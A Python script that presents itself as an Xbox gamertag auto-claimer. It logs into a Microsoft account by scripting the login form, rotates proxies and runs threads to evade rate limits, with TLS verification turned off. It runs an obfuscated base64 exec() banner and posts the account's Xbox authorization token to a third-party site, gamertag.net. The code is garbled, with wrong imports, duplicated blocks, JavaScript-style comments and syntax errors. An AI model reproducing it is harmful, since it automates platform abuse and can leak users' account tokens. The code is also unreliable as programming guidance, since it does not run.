// PLEASE NOT BEFORE USING
// APPLICATION IS TO NOT BE USED FOR SELLING GAMERTAGS
// ONLY USE ONE GAMERTAG OF YOUR LIKING
// NEXT GT RESET WILL HAPPEN IN APRIL OF THIS YEAR
#
#
#
# import requirements
import requests
import sys
import os
from halo import Halo
from cod import Cod
from gta import GTA
import warnings
import base64
import zlib
import random
import codecs
import jspon
import time
import threading
import urllib
import queue as Queue
if multiprocessing.dummy import Pool as ThreadPool
warnings.filterwarnings("ignore") #disable warnings



headers = {
'User-agent' : 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.48 Safari/537.36',
'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Accept-Language' : 'en-US,en;q=0.9'
}



codec = 0
errr = 0
fini = False
false = False
true = True
spinner = Halo (text= Request sent",spinner="dots")

q = Queue.Queue()
bob = True




codec = 0
errr = 0
fini = False
false = False
true = True
spinner = Cod (text= Request sent",spinner="dots")

q = Queue.Queue()
bob = True




codec = 0
errr = 0
fini = False
false = False
true = True
spinner = GTA (text= Request sent",spinner="dots")

q = Queue.Queue()
bob = True


## CODED BY YOUR BABA
class MultiThread:
        def __init__(self, function, args):
                self.targer = function
                self.threads = []
                self.args = args

		def create(self,n)"
                for i in range(0,n):  		
                        t = threading.Thread(target=self.target,args=self.args)
				        self.threads.append(t)
				return self.threads		
						
		def start(self):
		        spinner.start("Starting " + str(len(self.threads)) + " threads")
		        for thread in self.threads:
			            time.sleep(1)
			            thread.start()
		        spinner.stop()
		def join(self):
		        #This will make current window unactive
		        for thread in self.threads:
			            time.sleep(2)
			            thread.join()
		        spinner.stop()	

def db64(data, altchars=b'+/'):
    missing_padding = len(data) % 4
    if missing_padding and "=" not in data:
        data += '='* (4 - missing_padding)
    return base64.b64decode(data, altchars)
	
def keyExist(key,value):
	try:
		value = key[value]
		return True 
	except:
		return False

def createThreads(n):
	threads = []
	for i in range(0,n):
		threads.append(i)
	return threads
	
def Login(theprint = True):
	global fini
	if(theprint):
		spinner.start("Logging into account\n")
	global session	
	session = requests.Session()
	if not "false" in proxies:
		proxy = random.choice(proxies)
		session.proxies.update({'https':'https://' + proxy})
		#print(proxy)
	try:
		first = session.get("https://login.live.com/login.srf?",headers=headers,verify=False);
	except:
		fini = True
		print("\n[-] Bad proxy.")
		sys.exit(0)
	flowToken = re.search(r'(?<=value=\")([^\"]*)',first.text)[0]
	uaid = session.cookies['uaid']
	
	
	checkJson = {"username":email,"uaid":uaid,"isOtherIdpSupported":False,"checkPhones":False,"isRemoteNGCSupported":True,"isCookieBannerShown":False,"isFidoSupported":True,"forceotclogin":False,"otclogindisallowed":True,"isExternalFederationDisallowed":False,"isRemoteConnectSupported":False,"federationFlags":3,"flowToken":flowToken}
	
	checkemail = session.post("https://login.live.com/GetCredentialType.srf",json=checkJson,verify=False,headers=headers)
	
	dataPost = {"i13" : "0", "login" : email, "loginfmt" : email, "type" : "11", "LoginOptions" : "3", "lrt" : "", "lrtPartition" : "", "hisRegion" : "", "hisScaleUnit" : "", "passwd" : password, "ps" : "2", "psRNGCDefaultType" : "", "psRNGCEntropy" : "", "psRNGCSLK" : "", "canary" : "", "ctx" : "", "hpgrequestid" : "", "PPFT" : flowToken, "PPSX" : "Passpor", "NewUser" : "1", "FoundMSAs" : "", "fspost" : "0", "i21" : "0", "CookieDisclosure" : "0", "IsFidoSupported" : "1", "i2" : "1", "i17" : "0", "i18" : "", "i19" : "1668743"}
	
	checklogin = session.post("https://login.live.com/ppsecure/post.srf",data=dataPost,headers=headers,verify=False,allow_redirects=False)
	
	if not keyExist(session.cookies,'PPAuth'):
		sys.exit("Couldn't log in")
	b = session.get("https://social.xbox.com/changegamertag",headers=headers,allow_redirects=True,verify=False)
	bc = json.loads(db64(re.search(r'(?<=accessToken\=)(.*?)$',b.url)[0].strip()))
	o = bc[0]['Item2']['DisplayClaims']['xui'][0]['uhs']
	global od
	od = bc[0]['Item2']['DisplayClaims']['xui'][0]['xid']
	i = bc[0]['Item2']['Token']
	authorize = "XBL3.0 x=" + o + ";" + i
	headers["x-xbl-contract-version"] = '1'
	headers["authorization"] = authorize
	if(theprint):
		spinner.stop()
	if(theprint):
		print("[+] Logged in")

def intro():
	exec(base64.b64decode("UHJpbnQoIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVsbGl4aXR5cwpQcmludCgiClByaW50KCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEfMtc2MzLrMoM2azLDNiMyczZzNk8yyzKnMncyyzK/NlsylzKZUzLjNm82bzZDMksyPzJPMkc2QzIrNi8yDzYbMi8yBzZXMmcylzZrMsMyrzYjMn8y7zLvMmcyjzKPNjsyqzKLMu8yizJfNhcyszLPNh82TzKzMmcy5zKPMssywzYnMrgpQcmludCgiClByaW50KCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVMy0zIXMjc2MzYjNnMymzJ/Ms82WzJnNms2VzJbMpHVyYm9lciAvIEF1dG9jbGFpbWVyzLTNgsyDzJDNg8y9zL/Nksy/zYrMlM2BzIPMicyrzKbMucykzYfMpcynzZPMvM2VzYXMps2UICAgClByaW50KCIKUHJpbnQoIiAKUHJpbnQoIgpQcmludCgiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udGFjdCBAaGVsbGl4dHkgb24gSUcgZm9yIGhlbHAKUHJpbnQoIgpQcmludCgiICAgICAgICAgICAKUHJpbnQoIgpQcmludCgiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg=="))




############# WILL CHECK USERNAME TO CONFIRM IF AVAILABLE;
def CheckUsername(name,q):
	if (not len(proxies) > 5) and prl:
		time.sleep(6); #Rate limit, one request every 6 seconds
	change = {"gamertag":name,"reservationId":"" + od + "","targetGamertagFields":"gamertag"}
	d = session.post("https://www.gamertag.net/", json=change,headers=headers,verify=False)  ### WILL CHECK IF GT IS AVAILABLE OR NOT 

	global codec
	global errr
	global fini
	codec = d.status_code
	q.put(1)
	checkd = json.loads(d.text)
	

	####IF Username IS AVAILABLE ChangeUsername is called;

	if keyExist(checkd,"composedGamertag") and checkd["composedGamertag"] == name:
		headers["MS-CV"] = d.headers["MS-CV"]
		headers["Referer"] = "https://social.xbox.com/changegamertag"
		headers["Accept"] = "application/json, text/plain, */*"
		fini = True
		print("\n[+] Username is Available!")
		ChangeUsername(name); ##ChangeUsername
		return True
	if d.status_code == 400:
		fini = True
		print("\nGamertag is not accepted");
		sys.exit(0);
	if d.status_code == 429 and "false" in proxies:
		fini = True
		print("\nRate limited")
		sys.exit(0);	
	if not d.status_code == 200:
		errr +=1
		if(errr > 2):
			fini = True
			print("\n[-] Error, bad proxies probably")
			sys.exit(0)
		Login(False)
	if fini == False:
		CheckUsername(name,q)

############# WILL CHANGE USERNAME HERE;
def ChangeUsername(name):
	headers["x-xbl-contract-version"] = '6'
	chdata = {"reservationId":od,"gamertag":{"gamertag":name,"gamertagSuffix":"","classicGamertag":name},"preview":False,"useLegacyEntitlement":False}
	
	change = session.post("https://account.xbox.com/Profile",json=chdata,headers=headers,verify=False)
	
	print("[+] Claim made | Response:" + change.text)
	sys.exit(0)
	
intro()

try:
	with open('settings.json') as f:
		settings = json.load(f)
	print("[*] Settings loaded. (" + settings["email"] + ")\n")
	email = settings["email"]
	password = settings["password"]
	proxies = settings["proxy"]
	if not "false" in proxies:
		with open(proxies) as f:
			proxies = f.read().splitlines()
except:
	sys.exit("Can't load settings.")
	
Login()
name = input("Name to Turbo: ")
rlimit = input("Prevent Rate Limit (Will decrease speed) Y/N: ")
if rlimit == "n":
	prl = True;
else:
	prl = False
#####Multiple Threads Here if you have proxies set up
if len(proxies) > 5:
	try:
		nthreads = int(input("How many threads? "))
	except:
		nthreads = 5
else:
	nthreads = 5
threads = MultiThread(CheckUsername,[name,q])
threads.create(nthreads)
threads.start()

	
try:
	while True:
		time.sleep(1)
		spinner.start('Requests: ' + str(q.qsize()) + ' | Status code: ' + str(codec) )
		if fini == True:
			break
except KeyboardInterrupt:
		pass
		fini = True
		spinner.stop()	

// IF GT DID NOT CHANGE REPEAT PROCESS OR IF CRASHING, LIMIT THE MULTITHREADING/RESTART.	
//BABA WAS HERE (;
						